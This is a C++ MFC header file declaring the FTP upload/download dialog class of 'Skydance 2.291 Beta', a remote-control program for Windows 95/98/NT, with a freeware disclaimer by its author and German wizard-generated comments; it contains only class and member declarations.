/**********************************************************************************/
// Read this First!
// Skydance 2.291 Beta Release source code for MFC-VC++ 6.0
// by Edrin@gmx.net
//
// http://skd.box.sk
// - USE SKYDANCE/SKYDANCE SOURCE-CODE AND/OR IT`S COMPONENTS ON YOUR OWN RISK -
//
// Introduction:
//	This Source is FREEWARE!
//	SkyServer is a component of Skydance!
//	Skydance is designed to control other Win95/98/NT systems in tcp/ip-nets like Internet and Intranets.
//	Skydance 2.291 Beta Release is a program that will remain "under construction" and i will NEVER be
//	responsible for any HARM or harmfull things that happend because SKYDANCE(or skydance-source) was USED! 
//	That means I do NOT	guarantee for any features and security-thing
//	and i do not guarantee that this program works proper!!!
//	Indeed i guarantee for nothing ;)
//good luck, Edrin
/**********************************************************************************/
#if !defined(AFX_DLGFTP_H__AF291E00_F296_11D3_A059_00C026A21151__INCLUDED_)
#define AFX_DLGFTP_H__AF291E00_F296_11D3_A059_00C026A21151__INCLUDED_

#include "SkyThread.h"	// Hinzugefügt von der Klassenansicht
#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// DlgFtp.h : Header-Datei
//

/////////////////////////////////////////////////////////////////////////////
// Dialogfeld CDlgFtp 

class CDlgFtp : public CDialog
{
// Konstruktion
public:
	bool m_bUpDown;
	CDlgFtp(CWnd* pParent = NULL);   // Standardkonstruktor

// Dialogfelddaten
	//{{AFX_DATA(CDlgFtp)
	enum { IDD = IDD_DLGFTP };
	CButton	m_BtUpDown;
	CString	m_sFileNameC;
	CString	m_sFileNameS;
	int		m_iFtpPort;
	int		m_iDirection;
	//}}AFX_DATA


// Überschreibungen
	// Vom Klassen-Assistenten generierte virtuelle Funktionsüberschreibungen
	//{{AFX_VIRTUAL(CDlgFtp)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV-Unterstützung
	//}}AFX_VIRTUAL

// Implementierung
protected:
	// Generierte Nachrichtenzuordnungsfunktionen
	//{{AFX_MSG(CDlgFtp)
	afx_msg void OnBtpath();
	afx_msg void OnBtupdown();
	afx_msg void OnShowWindow(BOOL bShow, UINT nStatus);
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ fügt unmittelbar vor der vorhergehenden Zeile zusätzliche Deklarationen ein.

#endif // AFX_DLGFTP_H__AF291E00_F296_11D3_A059_00C026A21151__INCLUDED_
